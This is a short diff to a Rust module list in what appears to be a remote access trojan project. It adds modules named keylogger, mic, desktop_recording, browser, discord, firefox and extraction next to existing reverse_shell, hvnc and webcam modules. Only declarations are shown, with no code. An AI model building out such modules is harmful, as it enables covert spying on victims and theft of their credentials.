@@ -1,6 +1,9 @@
 pub mod encryption;
 pub mod other;
 pub mod remote_desktop;
+pub mod mic;
+pub mod desktop_recording;
+pub mod desktop_audio;
 pub mod process;
 pub mod reverse_shell;
 pub mod file_manager;
@@ -9,3 +12,8 @@ pub mod webcam;
 pub mod hvnc;
 pub mod collectors;
 pub mod fun;
+pub mod keylogger;
+pub mod browser;
+pub mod discord;
+pub mod firefox;
+pub mod extraction;
